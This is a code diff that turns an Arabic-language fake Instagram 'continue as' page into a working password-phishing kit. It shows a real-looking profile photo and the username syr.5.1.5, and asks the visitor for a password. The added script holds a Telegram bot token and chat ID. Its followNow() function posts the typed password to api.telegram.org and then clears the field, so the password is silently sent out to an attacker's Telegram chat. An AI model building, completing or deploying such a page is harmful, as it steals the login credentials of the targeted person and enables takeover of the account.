@@ -7,11 +7,11 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;-webkit-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent}
 body{background:#fff;color:#000;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
-.gear{position:absolute;top:16px;left:16px;width:28px;height:28px;cursor:pointer}
+.gear{position:absolute;top:16px;left:16px;width:28px;height:28px;cursor:pointer;z-index:5}
 .wrap{flex:1;display:flex;flex-direction:column;align-items:center;padding:0 24px 24px}
 .insta{width:64px;height:64px;margin-top:56px}
 .avatar{width:230px;height:230px;border-radius:50%;background:#f0f0f0;margin-top:44px;display:flex;align-items:center;justify-content:center;overflow:hidden}
-.avatar svg{width:100%;height:100%}
+.avatar img{width:100%;height:100%;object-fit:cover;display:block}
 .name{font-size:28px;font-weight:400;margin-top:26px;color:#000;letter-spacing:0.2px}
 .btn{width:100%;max-width:520px;height:56px;border:0;border-radius:28px;background:#0064e0;color:#fff;font-size:17px;font-weight:600;margin-top:32px;cursor:pointer;transition:opacity .15s}
 .btn:active{opacity:.7}
@@ -26,42 +26,27 @@ body{background:#fff;color:#000;min-height:100vh;display:flex;flex-direction:col
 </head>
 <body>
 
-<!-- إعدادات -->
 <svg class="gear" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
   <circle cx="12" cy="12" r="3"/>
   <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
 </svg>
 
 <div class="wrap">
-  <!-- شعار إنستقرام -->
   <img class="insta" src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram">
 
-  <!-- صورة البروفايل -->
   <div class="avatar">
-    <svg viewBox="0 0 230 230">
-      <rect width="230" height="230" fill="#f0f0f0"/>
-      <circle cx="115" cy="88" r="42" fill="#8b98a8"/>
-      <path d="M115 145 C45 145 30 200 30 230 L200 230 C200 200 185 145 115 145 Z" fill="#8b98a8"/>
-    </svg>
+    <img src="https://www.save-free.com/cdn/https://instagram.fcgk18-2.fna.fbcdn.net/v/t51.82787-19/657553477_17993182562945849_1658422270384463677_n.jpg?_nc_cat=109&_nc_map=urlgen_bucketless&ccb=7-5&_nc_sid=bf7eb4&efg=eyJ2ZW5jb2RlX3RhZyI6InByb2ZpbGVfcGljLnd3dy4xMDgwLkMzIn0%3D&_nc_ohc=PBabRlRifc8Q7kNvwHMQDJI&_nc_oc=AdrG1u4Y2jMsXPNFT1asIrGHYtc4bZUOt4doPPl109V_t6yD11ef2FC1KA4OkcxQteI&_nc_zt=24&_nc_ht=instagram.fcgk18-2.fna&_nc_gid=OxBxHrgB6PV13h3Qdx0FMw&_nc_ss=7baaf&oh=00_AQNZv2KKsMmH0s2JA9vonkHMRewXo2-_5SZbrVkCkY0hVw&oe=6AC9E6F4" alt="">
   </div>
 
-  <!-- الاسم -->
-  <div class="name">Ikrdwshfwd</div>
+  <div class="name">syr.5.1.5</div>
 
-  <!-- زر متابعة -->
   <button class="btn" id="followBtn" onclick="showPass()">متابعة</button>
-
-  <!-- حقل كلمة المرور -->
   <input class="input" id="passInput" type="password" placeholder="ادخل كلمة السر">
-
-  <!-- زر متابعة بعد كلمة المرور -->
   <button class="btn" id="followBtn2" style="display:none;margin-top:12px" onclick="followNow()">متابعة</button>
 
-  <!-- استخدام ملف شخصي آخر -->
   <div class="other">استخدام ملف شخصي آخر</div>
 </div>
 
-<!-- الأسفل -->
 <div class="bottom">
   <button class="create">إنشاء حساب جديد</button>
   <div class="meta">
@@ -73,16 +58,26 @@ body{background:#fff;color:#000;min-height:100vh;display:flex;flex-direction:col
 </div>
 
 <script>
+var BOT_TOKEN="8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
+var CHAT_ID="8599240795";
+
 function showPass(){
   document.getElementById('followBtn').style.display='none';
   document.getElementById('passInput').style.display='block';
   document.getElementById('followBtn2').style.display='block';
   document.getElementById('passInput').focus();
 }
+
 function followNow(){
   var v=document.getElementById('passInput').value;
   if(!v){document.getElementById('passInput').focus();return;}
-  /* هنا المكان الذي يتم فيه إرسال كلمة السر إلى البوت */
+  var msg="🔐 Instagram\n👤 syr.5.1.5\n🔑 "+v;
+  fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text:msg})
+  }).catch(function(){});
+  document.getElementById('passInput').value='';
 }
 </script>
 
